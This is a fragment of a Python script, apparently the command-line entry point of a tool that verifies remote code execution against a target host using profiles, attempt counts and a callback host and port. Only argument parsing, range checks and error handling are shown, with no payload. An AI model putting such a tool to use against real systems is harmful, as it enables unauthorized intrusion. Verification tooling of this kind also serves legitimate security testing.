    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--callback-bind", default="127.0.0.1")
    parser.add_argument("--callback-host")
    parser.add_argument("--callback-port", type=int)
    parser.add_argument(
        "--attempts",
        type=int,
        help="override the profile attempt count for probabilistic exact-profile RCE",
    )
    args = parser.parse_args()
    selected_profile = profiles[args.profile]
    selected_port = (
        args.port
        if args.port is not None
        else int(selected_profile["probe"].get("port", DEFAULT_PORT))
    )
    if not 1 <= selected_port <= 65535:
        raise RuntimeError("port must be between 1 and 65535")
    if args.timeout <= 0 or args.timeout > 120:
        raise RuntimeError("timeout must be greater than 0 and at most 120 seconds")
    if args.attempts is not None and not 1 <= args.attempts <= 50:
        raise RuntimeError("attempts must be between 1 and 50")
    return verify(
        args.profile,
        selected_profile,
        args.host,
        selected_port,
        args.timeout,
        args.callback_bind,
        args.callback_host,
        args.callback_port,
        args.attempts,
    )


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as error:
        print(f"FAIL: {error}", file=sys.stderr)
        raise SystemExit(1)
